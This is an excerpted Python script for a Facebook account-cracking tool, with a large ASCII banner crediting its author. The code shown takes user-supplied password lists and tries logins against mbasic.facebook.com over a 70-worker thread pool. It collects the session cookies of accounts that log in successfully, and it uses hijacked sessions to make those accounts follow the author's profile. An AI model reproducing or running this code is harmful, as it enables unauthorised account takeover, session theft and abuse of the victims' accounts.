...
from os import system as Tamzid
try:
    import requests
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/itzUzzalVau2008', {
...
\033[1;33m╔═══════════════════════════════════════════════╗
║        \033[1;32m  WELLCOME TO UZZAL VAU            \033[1;33m ║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[33;1m║ ╔═══════════════════════════════════════════╗ ║
\033[34;1m║ ║❤︎[❥] ᥬ𝐓𝐎𝐋𝐋➤➤❦❦❦❦\033[31;1m𝐍𝐀𝐌𝐄➤\033[32;1mUZZAL➤               ║ ║
\033[35;1m║ ║❤︎[❥] ᥬ𝐀𝐔𝐓𝐇𝐎𝐑➤➤❦❦❦\033[32;1mSAUDI➤\033[33;1m❥𝐂𝐘𝐁𝐄𝐑➤            ║ ║
\033[36;1m║ ║❤︎[❥] ᥬ𝐆𝐈𝐓𝐇𝐔𝐁➤➤❦❦❦\033[33;1mGNDR-➤\033[34;1m❥Cyber\033[34;1m➤           ║ ║
\033[37;1m║ ║❤︎[❥] ᥬ𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊➤➤❦❦❦\033[34;1m𝙈𝙙.UZZAL➤\033[35;1m𝙃𝙤𝙨𝙨𝙖𝙞𝙣       ║ ║
\033[31;1m║ ║❤︎[❥] ᥬ𝐆𝐑𝐔𝐏➤➤❦❦❦\033[35;1mITZ UZZAL VAU➤\033[92;1m❥➤             ║ ║
\033[32;1m║ ║❤︎[❥] ᥬ𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙋𝘼𝙂𝙀➤➤❦❦❦\033[36;1mUZZAL VAU ➤     ║ ║
\033[33;1m║ ╚═══════════════════════════════════════════╝ ║
\033[34;1m╚═══════════════════════════════════════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
...
def xxr():
    ...
    HamiiID = []
    print("")
    for Uzzal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {Uzzal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=70) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mUzzal')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [Uzzal-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}Uzzal💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
